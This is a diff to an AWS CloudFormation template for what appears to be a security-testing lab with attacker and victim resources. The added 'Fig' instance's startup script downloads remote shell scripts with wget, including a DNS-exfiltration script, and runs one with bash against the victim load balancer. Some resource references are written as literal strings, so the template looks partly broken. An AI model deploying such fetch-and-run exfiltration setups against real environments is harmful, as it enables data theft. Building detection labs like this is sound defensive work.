@@ -661,15 +661,7 @@ Resources:
         Ref: AttackerPublicSubnet
       RouteTableId:
         Ref: AttackerPublicSubnetRouteTable
-  AttackerEIP:
-    Type: AWS::EC2::EIP
-    Properties:
-      Domain: vpc
-  AssociateAttackerEIP:
-    Type: AWS::EC2::EIPAssociation
-    Properties:
-      AllocationId: !GetAtt AttackerEIP.AllocationId
-      NetworkInterfaceId: !Ref AttackerNetInt
+
   AttackerSecurityGroup:
     DependsOn: AttackerVPC
     Type: AWS::EC2::SecurityGroup
@@ -782,6 +774,84 @@ Resources:
                   - logs:TestMetricFilter
                   - logs:FilterLogEvents
                 Resource: '*'
+
+
+
+  FigEIP:
+    Type: AWS::EC2::EIP
+    Properties:
+      Domain: vpc
+  AssociateFigEIP:
+    Type: AWS::EC2::EIPAssociation
+    Properties:
+      AllocationId: "FigEIP"
+      NetworkInterfaceId: "FigNetInt"
+  FigNetInt:
+    DependsOn: AttackerVPC
+    Type: AWS::EC2::NetworkInterface
+    Properties:
+      SubnetId: !Ref 'AttackerPublicSubnet'
+      GroupSet:
+        - !Ref 'AttackerSecurityGroup'
+  Fig:
+    DependsOn:
+      - "FigNetInt"
+    Type: AWS::EC2::Instance
+    Properties:
+      KeyName: !Ref 'KeyPairName'
+      NetworkInterfaces:
+        - NetworkInterfaceId: "FigNetInt"
+          DeviceIndex: '0'
+      UserData:
+        Fn::Base64: !Sub |
+          #! /bin/bash
+          # version 3.0
+          # export account id and region on instance startup
+          # Added region and cloudwatch log group
+          exec > /tmp/part-001.log 2>&1
+          cat > /etc/profile.d/load_env.sh << 'EOF'
+          export ATTACKER=$(curl http://169.254.169.254/latest/meta-data/public-ipv4)
+          export VICTIM=${PublicLoadBalancer.DNSName}
+          export REGION=${AWS::Region}
+          export LOG_GROUP=${LogGroup}
+          EOF
+          sudo cd /var/tmp
+          sudo wget -O initialize_attacker.sh https://raw.githubusercontent.com/jhseceng/secframework/master/scripts/initialize_fig_aws_ami.sh
+          sudo wget -O dns-exfil.sh https://raw.githubusercontent.com/jhseceng/secframework/master/scripts/dns-exfil.sh
+          sudo chmod 755 initialize_attacker.sh
+          sudo chmod 755 dns-exfil.sh
+          sudo bash ./initialize_attacker.sh -v ${PublicLoadBalancer.DNSName} -r ${AWS::Region} -l ${LogGroup}
+      InstanceType: m4.large
+      AvailabilityZone: !Select
+        - '0'
+        - !Ref 'AvailabilityZones'
+      IamInstanceProfile: !Ref AttackerBootstrapInstanceProfile
+      ImageId: !Ref 'LatestLinuxAMI'
+      Tags:
+        - Key: Name
+          Value: Fig
+        - Key: CRWD_MANAGED
+          Value: YES
+        - Key: cstag-accounting
+          Value: !Ref CSAccounting
+        - Key: cstag-business
+          Value: !Ref CSBusiness
+        - Key: cstag-department
+          Value: !Ref CSDepartment
+        - Key: cstag-owner
+          Value: !Ref CSOwner
+
+
+
+  AttackerEIP:
+    Type: AWS::EC2::EIP
+    Properties:
+      Domain: vpc
+  AssociateAttackerEIP:
+    Type: AWS::EC2::EIPAssociation
+    Properties:
+      AllocationId: "AttackerEIP"
+      NetworkInterfaceId: "AttackerNetInt"
   AttackerNetInt:
     DependsOn: AttackerVPC
     Type: AWS::EC2::NetworkInterface
@@ -789,35 +859,14 @@ Resources:
       SubnetId: !Ref 'AttackerPublicSubnet'
       GroupSet:
         - !Ref 'AttackerSecurityGroup'
-
-
-  AttackerEIP4:
-    Type: AWS::EC2::EIP
-    Properties:
-      Domain: vpc
-  AssociateAttackerEIP4:
-    Type: AWS::EC2::EIPAssociation
-    Properties:
-      AllocationId: !GetAtt AttackerEIP4.AllocationId
-      NetworkInterfaceId: !Ref AttackerNetInt4
-
-
-
-  AttackerNetInt4:
-    DependsOn: AttackerVPC
-    Type: AWS::EC2::NetworkInterface
-    Properties:
-      SubnetId: !Ref 'AttackerPublicSubnet'
-      GroupSet:
-        - !Ref 'AttackerSecurityGroup'
-  Attacker4:
+  Attacker:
     DependsOn:
-      - AttackerNetInt4
+      - "AttackerNetInt"
     Type: AWS::EC2::Instance
     Properties:
       KeyName: !Ref 'KeyPairName'
       NetworkInterfaces:
-        - NetworkInterfaceId: !Ref 'AttackerNetInt4'
+        - NetworkInterfaceId: "AttackerNetInt"
           DeviceIndex: '0'
       UserData:
         Fn::Base64: !Sub |
@@ -848,8 +897,16 @@ Resources:
       Tags:
         - Key: Name
           Value: Attacker
-        - Key: CreatedBy
-          Value: ReInforce Test Script
+        - Key: CRWD_MANAGED
+          Value: YES
+        - Key: cstag-accounting
+          Value: !Ref CSAccounting
+        - Key: cstag-business
+          Value: !Ref CSBusiness
+        - Key: cstag-department
+          Value: !Ref CSDepartment
+        - Key: cstag-owner
+          Value: !Ref CSOwner
 
   PublicLoadBalancer:
     Type: AWS::ElasticLoadBalancingV2::LoadBalancer
